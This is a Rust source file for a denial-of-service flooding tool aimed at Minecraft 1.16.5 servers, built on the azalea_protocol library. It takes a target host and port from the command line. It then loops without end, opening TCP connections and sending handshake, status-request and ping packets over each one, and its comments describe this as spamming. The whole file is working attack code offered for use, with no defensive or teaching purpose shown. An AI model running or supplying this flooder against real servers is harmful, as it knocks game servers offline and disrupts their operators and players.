use azalea_protocol::{
    connect::Connection,
    packets::{
        handshake::{client_intention_packet::ClientIntentionPacket, ServerboundHandshakePacket},
        status::{
            serverbound_ping_request_packet::ServerboundPingRequestPacket,
            serverbound_status_request_packet::ServerboundStatusRequestPacket,
            ServerboundStatusPacket,
        },
        ConnectionProtocol, ProtocolPacket,
    },
};
use azalea_protocol::read::ReadPacketError;
use tokio::{
    sync::mpsc::{self, Receiver, Sender},
    task,
    net::ToSocketAddrs
};
use std::io::Cursor;
use tokio::net::TcpStream;
use std::io::Error as IoError;
use std::io::Write;

// 1.16.5
const PROTOCOL_NUMBER: u32 = 754;

#[tokio::main]
async fn main() {
    let args = std::env::args().collect::<Vec<String>>();
    let hostname = args.get(1).expect("No hostname provided");
    let port = args
        .get(2)
        .expect("No port provided")
        .parse::<u16>()
        .expect("Port is not a number");
    let address_string = format!("{}:{}", hostname, port);

    // Create channels
    let (connect_sender, connect_receiver) = mpsc::channel(1000);

    // Spawn tasks
    let connect_thread = task::spawn(connect_thread(address_string, connect_sender));
    let status_thread = task::spawn(status_thread(connect_receiver, hostname.to_string(), port));

    // Wait for tasks to finish
    connect_thread.await.ok();
    status_thread.await.ok();
}

// Thread that spams tcp connects
async fn connect_thread(ip: impl ToSocketAddrs + Clone, stream_sender: Sender<TcpStream>) {
    let ip = ip.clone();
    loop {
        if let Ok(stream) = TcpStream::connect(&ip).await {
            stream_sender.send(stream).await.ok();
        }
    }
}

// Thread that spams status requests
async fn status_thread(mut stream_receiver: Receiver<TcpStream>, hostname: String, port: u16) {
    loop {
        if let Some(stream) = stream_receiver.recv().await {
            let mut connection: Connection<PacketsIWantToWrite, PacketsIWantToWrite> = Connection::wrap(stream);

            let intention = ClientIntentionPacket {
                protocol_version: PROTOCOL_NUMBER,
                hostname: hostname.to_owned(),
                port,
                intention: ConnectionProtocol::Status,
            };
            let handshake_packet = ServerboundHandshakePacket::ClientIntention(intention);
            connection.write(PacketsIWantToWrite::Handshake(handshake_packet)).await.ok();

            let status_request_packet =
                ServerboundStatusPacket::StatusRequest(ServerboundStatusRequestPacket {});
            connection.write(PacketsIWantToWrite::Status(status_request_packet)).await.ok();

            // Add ping so it works immediately (otherwise the server waits 30 seconds before responding)
            let ping_packet =
                ServerboundStatusPacket::PingRequest(ServerboundPingRequestPacket { time: 0 });
            connection.write(PacketsIWantToWrite::Status(ping_packet)).await.ok();
        }
    }
}

// Why do I have to do this hack?
// I will never know
// Mat pls add writing with regular write trait to azalea ty
// No I will not use dynamic dispatch I just won't
#[derive(Debug, Clone)]
enum PacketsIWantToWrite {
    Handshake(ServerboundHandshakePacket),
    Status(ServerboundStatusPacket),
}

// Dummy implementation
impl ProtocolPacket for PacketsIWantToWrite {
    fn id(&self) -> u32 {
        match self {
            PacketsIWantToWrite::Handshake(a) => a.id(),
            PacketsIWantToWrite::Status(a) => a.id(),
        }
    }
    // We ain't reading nothing anyway
    fn read(_id: u32, _buf: &mut Cursor<&[u8]>) -> Result<Self, Box<ReadPacketError>> {
        unimplemented!()
    }
    fn write(&self, buf: &mut impl Write) -> Result<(), IoError> {
        match self {
            PacketsIWantToWrite::Handshake(a) => a.write(buf),
            PacketsIWantToWrite::Status(a) => a.write(buf),
        }
    }
}
